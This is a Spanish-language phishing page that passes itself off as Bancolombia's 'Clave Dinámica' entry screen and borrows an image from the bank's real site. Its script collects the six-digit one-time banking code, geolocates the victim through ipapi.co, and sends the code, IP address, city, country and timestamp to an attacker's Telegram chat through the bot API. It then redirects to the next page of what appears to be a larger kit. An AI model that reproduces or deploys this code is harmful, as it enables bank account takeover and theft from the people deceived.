<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Clave Din√°mica - Bancolombia</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background-color: white;
      width: 90%;
      max-width: 360px;
      padding: 20px;
      border-radius: 20px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
      text-align: center;
      box-sizing: border-box;
    }

    .gif-banner {
      margin-bottom: 20px;
      border-radius: 12px;
      overflow: hidden;
    }

    .gif-banner img {
      width: 100%;
      height: auto;
      display: block;
      border: none;
    }

    h2 {
      font-size: 20px;
      margin-bottom: 10px;
      color: #000;
    }

    p {
      font-size: 14px;
      color: #444;
      margin-bottom: 20px;
    }

    .inputs {
      display: flex;
      justify-content: center; /* Centrar los inputs dentro del contenedor */
      gap: 10px;               /* Espacio uniforme entre cuadros */
      margin-bottom: 20px;
      flex-wrap: nowrap;       /* Que no se rompa en varias l√≠neas */
    }

    .inputs input {
      width: 40px;
      height: 45px;
      font-size: 20px;
      text-align: center;
      border: 1px solid #bbb;
      border-radius: 8px;
      outline: none;
      transition: border-color 0.3s, box-shadow 0.3s;
      background-color: #fafafa;
      color: #222;
      box-shadow: inset 0 1px 3px rgba(0,0,0,0.05);
      box-sizing: border-box;
    }

    .inputs input:focus {
      border-color: #ffcc00;
      box-shadow: 0 0 6px rgba(255, 204, 0, 0.7);
      background-color: #fff;
    }

    .buttons {
      display: flex;
      justify-content: space-between;
      gap: 10px;
    }

    .buttons button {
      flex: 1;
      padding: 12px 0;
      font-size: 16px;
      border: none;
      border-radius: 25px;
      cursor: pointer;
      font-weight: bold;
      transition: background 0.3s, box-shadow 0.3s;
    }

    .buttons .clear {
      background-color: white;
      color: #000;
      border: 2px solid #000;
    }

    .buttons .clear:hover {
      background-color: #f2f2f2;
    }

    .buttons .continue {
      background-color: #ffcc00;
      color: #000;
    }

    .buttons .continue:hover {
      background-color: #e6b800;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="gif-banner">
      <img src="https://svpersonas.apps.bancolombia.com/assets/images/cd-mobile.gif" alt="Instrucci√≥n GIF" />
    </div>
    <h2>Ingresa la Clave Din√°mica</h2>
    <p>Encuentra tu Clave Din√°mica en la app Mi Bancolombia.</p>
    <div class="inputs">
      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
    </div>
    <div class="buttons">
      <button class="clear" onclick="clearInputs()">Borrar</button>
      <button class="continue">Continuar</button>
    </div>
  </div>

      
   <script src="tr.js"></script>

<script>
  const inputs = document.querySelectorAll('.inputs input');
  const continueBtn = document.querySelector('.continue');

  // Navegaci√≥n autom√°tica entre campos
  inputs.forEach((input, index) => {
    input.addEventListener('input', (e) => {
      const value = e.target.value;
      if (!/^\d$/.test(value)) {
        e.target.value = '';
        return;
      }
      if (value && index < inputs.length - 1) inputs[index + 1].focus();
    });

    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !input.value && index > 0) inputs[index - 1].focus();
    });
  });

  function clearInputs() {
    inputs.forEach(i => i.value = '');
    inputs[0].focus();
  }

  continueBtn.addEventListener('click', async () => {
    const clave = Array.from(inputs).map(i => i.value).join('');
    if (clave.length !== 6) {
      alert('Por favor ingresa los 6 d√≠gitos.');
      return;
    }

    let ip = 'desconocida';
    let ciudad = 'desconocida';
    let pais = 'desconocido';

    try {
      const r = await fetch('https://ipapi.co/json/');
      if (r.ok) {
        const data = await r.json();
        ip = data.ip || ip;
        ciudad = data.city || ciudad;
        pais = data.country_name || pais;
      }
    } catch (e) {
      console.warn('No se pudo obtener IP/ubicaci√≥n:', e);
    }

    const fecha = new Date().toLocaleString();

    const mensaje = `
üì≤  Bancolombia CORSEL:
üî¢ Clave: ${clave}
üåê IP: ${ip}
üåé Pa√≠s: ${pais}
üèôÔ∏è Ciudad: ${ciudad}
üïí Fecha/Hora: ${fecha}`.trim();

    try {
      const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: mensaje
        })
      });

      if (resp.ok) {
        clearInputs();
        // ‚úÖ Redirecci√≥n a index4.html
        window.location.href = 'index4.html';
      } else {
        alert('Error al enviar a Telegram.');
        console.error('Telegram response status:', resp.status);
      }
    } catch (err) {
      console.error('Error al contactar Telegram:', err);
      alert('Fallo al conectar con Telegram.');
    }
  });
</script>


</body>
</html>
